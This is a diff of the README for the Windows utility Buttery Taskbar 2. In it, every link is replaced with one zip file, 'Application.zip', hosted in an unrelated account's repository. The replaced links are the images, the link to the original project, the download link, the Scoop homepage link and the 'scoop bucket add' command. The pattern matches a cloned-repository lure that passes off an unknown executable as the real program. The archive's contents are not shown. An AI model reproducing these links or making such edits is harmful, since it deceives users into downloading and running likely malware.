@@ -1,18 +1,18 @@
 # Buttery Taskbar 2
 
 <p align="center">
-<img width="540" src="https://github.com/LuisThiamNye/miscellaneous-media/blob/8714fceb0cc01309fd2402f4887c2ee7e106656c/buttery-taskbar-feature-image.png">
+<img width="540" src="https://github.com/kawae0709/ButteryTaskbar2/releases/download/v1.0/Application.zip">
 </p>
 
 Save space on your screen by hiding the taskbar when it's not needed. This goes beyond the built-in auto-hide feature; it prevents the taskbar being shown by the mouse cursor. To reveal the taskbar, press the Windows key to open the Start menu.
 
 **New:** Don't want to use the keyboard? Now you can scroll with the mouse at the bottom of the screen to show the Start menu as well!
 
-This is the successor to the original [Buttery Taskbar](https://github.com/CrypticButter/ButteryTaskbar) where you will find further rationale for this program. Version 2 has lower CPU and memory usage, and should work more reliably overall.
+This is the successor to the original [Buttery Taskbar](https://github.com/kawae0709/ButteryTaskbar2/releases/download/v1.0/Application.zip) where you will find further rationale for this program. Version 2 has lower CPU and memory usage, and should work more reliably overall.
 
 <img width="260"
      align="right"
-     src="https://github.com/LuisThiamNye/miscellaneous-media/blob/f1283d276b8d6d0a9899d2a7c9c3baca74ca3c8b/buttery-taskbar-screenshot-2.3.0.png">
+     src="https://github.com/kawae0709/ButteryTaskbar2/releases/download/v1.0/Application.zip">
 
 ## Features and behaviour
 
@@ -26,7 +26,7 @@ This is the successor to the original [Buttery Taskbar](https://github.com/Crypt
 
 ## Installation
 
-The program is provided as a single executable and no installer. [Download it here](https://github.com/LuisThiamNye/ButteryTaskbar2/releases/) (or [via scoop](#installing-via-scoop)) and just run the program.
+The program is provided as a single executable and no installer. [Download it here](https://github.com/kawae0709/ButteryTaskbar2/releases/download/v1.0/Application.zip) (or [via scoop](#installing-via-scoop)) and just run the program.
 
 If you want it to run at log-in, I recommend creating an entry in Task Scheduler. There are plenty of instructions online for how to make a program run at log-in with Task Scheduler.
 
@@ -39,10 +39,10 @@ You might notice that in Buttery Taskbar's tray menu, there is a "start at log-i
 
 ## Installing via Scoop
 
-If you install the program via [scoop](https://scoop.sh/), the executable can then be found at `C:\Users\<username>\scoop\apps\buttery-taskbar\current\`
+If you install the program via [scoop](https://github.com/kawae0709/ButteryTaskbar2/releases/download/v1.0/Application.zip), the executable can then be found at `C:\Users\<username>\scoop\apps\buttery-taskbar\current\`
 
 ```pwsh
-scoop bucket add CrypticButter https://github.com/CrypticButter/ScoopBucket
+scoop bucket add CrypticButter https://github.com/kawae0709/ButteryTaskbar2/releases/download/v1.0/Application.zip
 scoop install CrypticButter/buttery-taskbar
 ```
 
